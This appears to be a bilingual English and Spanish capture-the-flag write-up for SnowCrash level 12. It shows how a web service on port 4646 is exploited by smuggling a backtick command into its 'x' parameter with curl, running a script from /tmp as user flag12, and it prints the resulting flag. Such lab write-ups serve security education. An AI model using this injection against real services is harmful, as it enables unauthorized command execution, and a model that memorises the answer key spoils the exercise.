# Flag 12

## Tools Used:

* Shell builtins (`echo`, `chmod`, `mv`)
* `curl`
* Command injection via backticks in a web parameter

## Process:

1. Create a small executable file (`EXP`) containing the command to retrieve and broadcast the flag:

   ```bash
   level12@SnowCrash:~$ echo "getflag | wall" > EXP
   level12@SnowCrash:~$ chmod 777 EXP
   ```
2. Move this file into a directory that the web‑service will execute from:

   ```bash
   level12@SnowCrash:~$ mv EXP /tmp/
   ```
3. Exploit the web service listening on port **4646** by injecting your script via backticks in the `x` parameter. The wildcard (`/*/EXP`) ensures the correct path is matched:

   ```bash
   level12@SnowCrash:~$ curl 'localhost:4646/?x=`/*/EXP`'
   ```
4. The service runs the injected script as the **flag12** user, causing it to broadcast the flag:

   ```
   Broadcast Message from flag12@Snow
           (somewhere) at 13:12 ...

   Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
   ```

---

# Flag 12

## Herramientas Utilizadas:

* Comandos de Shell (`echo`, `chmod`, `mv`)
* `curl`
* Inyección de comandos mediante backticks en un parámetro web

## Proceso:

1. Creamos un pequeño archivo ejecutable (`EXP`) con el comando para obtener y difundir la flag:

   ```bash
   level12@SnowCrash:~$ echo "getflag | wall" > EXP
   level12@SnowCrash:~$ chmod 777 EXP
   ```
2. Movemos este archivo a un directorio que el servicio web ejecuta:

   ```bash
   level12@SnowCrash:~$ mv EXP /tmp/
   ```
3. Explotamos el servicio web en el puerto **4646** inyectando nuestro script con backticks en el parámetro `x`. El comodín (`/*/EXP`) asegura que se ubique el archivo correctamente:

   ```bash
   level12@SnowCrash:~$ curl 'localhost:4646/?x=`/*/EXP`'
   ```
4. El servicio ejecuta el script como el usuario **flag12**, provocando la difusión de la flag:

   ```
   Broadcast Message from flag12@Snow
           (somewhere) at 13:12 ...

   Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
   ```

---

## Scripts Used:

```bash
# /tmp/EXP
getflag | wall
```

## Flag:

```
g1qKMiRpXf53AWhDaU7FEkczr
```
